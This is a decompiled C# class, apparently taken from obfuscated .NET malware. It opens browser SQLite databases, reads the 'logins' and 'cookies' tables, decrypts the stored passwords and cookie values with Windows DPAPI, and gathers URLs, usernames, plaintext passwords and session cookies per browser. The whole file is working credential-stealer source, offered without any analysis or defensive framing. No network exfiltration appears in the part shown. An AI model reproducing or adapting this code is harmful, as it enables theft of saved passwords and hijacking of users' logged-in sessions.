using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

public class GClass9
{
	public class GClass10
	{
		[CompilerGenerated]
		private string string_0;

		[CompilerGenerated]
		private string string_1;

		[CompilerGenerated]
		private string string_2;

		[CompilerGenerated]
		private string string_3;

		[CompilerGenerated]
		private string string_4;

		[CompilerGenerated]
		private string string_5;

		[CompilerGenerated]
		private bool bool_0;

		[CompilerGenerated]
		private bool bool_1;

		[CompilerGenerated]
		private bool bool_2;

		[CompilerGenerated]
		private bool bool_3;

		[CompilerGenerated]
		private bool bool_4;

		[CompilerGenerated]
		private string string_6;

		public string HostKey
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public string Name
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public string Value
		{
			[CompilerGenerated]
			get
			{
				return string_2;
			}
			[CompilerGenerated]
			set
			{
				string_2 = value;
			}
		}

		public string Path
		{
			[CompilerGenerated]
			get
			{
				return string_3;
			}
			[CompilerGenerated]
			set
			{
				string_3 = value;
			}
		}

		public string ExpiresUTC
		{
			[CompilerGenerated]
			get
			{
				return string_4;
			}
			[CompilerGenerated]
			set
			{
				string_4 = value;
			}
		}

		public string LastAccessUTC
		{
			[CompilerGenerated]
			get
			{
				return string_5;
			}
			[CompilerGenerated]
			set
			{
				string_5 = value;
			}
		}

		public bool Secure
		{
			[CompilerGenerated]
			get
			{
				return bool_0;
			}
			[CompilerGenerated]
			set
			{
				bool_0 = value;
			}
		}

		public bool HttpOnly
		{
			[CompilerGenerated]
			get
			{
				return bool_1;
			}
			[CompilerGenerated]
			set
			{
				bool_1 = value;
			}
		}

		public bool Expired
		{
			[CompilerGenerated]
			get
			{
				return bool_2;
			}
			[CompilerGenerated]
			set
			{
				bool_2 = value;
			}
		}

		public bool Persistent
		{
			[CompilerGenerated]
			get
			{
				return bool_3;
			}
			[CompilerGenerated]
			set
			{
				bool_3 = value;
			}
		}

		public bool Priority
		{
			[CompilerGenerated]
			get
			{
				return bool_4;
			}
			[CompilerGenerated]
			set
			{
				bool_4 = value;
			}
		}

		public string Browser
		{
			[CompilerGenerated]
			get
			{
				return string_6;
			}
			[CompilerGenerated]
			set
			{
				string_6 = value;
			}
		}

		public override string ToString()
		{
			return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
		}
	}

	public static List<GClass56> smethod_0(string datapath, string browser)
	{
		List<GClass56> list = new List<GClass56>();
		GClass12 gClass = null;
		if (!File.Exists(datapath))
		{
			return list;
		}
		try
		{
			gClass = new GClass12(datapath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!gClass.method_9("logins"))
		{
			return list;
		}
		int num = gClass.method_2();
		for (int i = 0; i < num; i++)
		{
			try
			{
				string text = gClass.method_5(i, "origin_url");
				string text2 = gClass.method_5(i, "username_value");
				string text3 = smethod_2(gClass.method_5(i, "password_value"));
				if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text2) && text3 != null)
				{
					list.Add(new GClass56
					{
						URL = text,
						Username = text2,
						Password = text3,
						Application = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	public static List<GClass10> smethod_1(string dataPath, string browser)
	{
		List<GClass10> list = new List<GClass10>();
		GClass12 gClass = null;
		if (!File.Exists(dataPath))
		{
			return list;
		}
		try
		{
			gClass = new GClass12(dataPath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!gClass.method_9("cookies"))
		{
			return list;
		}
		int num = gClass.method_2();
		for (int i = 0; i < num; i++)
		{
			try
			{
				string text = gClass.method_5(i, "host_key");
				string text2 = gClass.method_5(i, "name");
				string value = smethod_2(gClass.method_5(i, "encrypted_value"));
				string path = gClass.method_5(i, "path");
				string expiresUTC = gClass.method_5(i, "expires_utc");
				string lastAccessUTC = gClass.method_5(i, "last_access_utc");
				bool secure = gClass.method_5(i, "secure") == "1";
				bool httpOnly = gClass.method_5(i, "httponly") == "1";
				bool expired = gClass.method_5(i, "has_expired") == "1";
				bool persistent = gClass.method_5(i, "persistent") == "1";
				bool priority = gClass.method_5(i, "priority") == "1";
				if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(value))
				{
					list.Add(new GClass10
					{
						HostKey = text,
						Name = text2,
						Value = value,
						Path = path,
						ExpiresUTC = expiresUTC,
						LastAccessUTC = lastAccessUTC,
						Secure = secure,
						HttpOnly = httpOnly,
						Expired = expired,
						Persistent = persistent,
						Priority = priority,
						Browser = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	private static string smethod_2(string EncryptedData)
	{
		if (EncryptedData != null && EncryptedData.Length != 0)
		{
			byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(EncryptedData), (byte[])null, (DataProtectionScope)0);
			return Encoding.UTF8.GetString(bytes);
		}
		return null;
	}
}
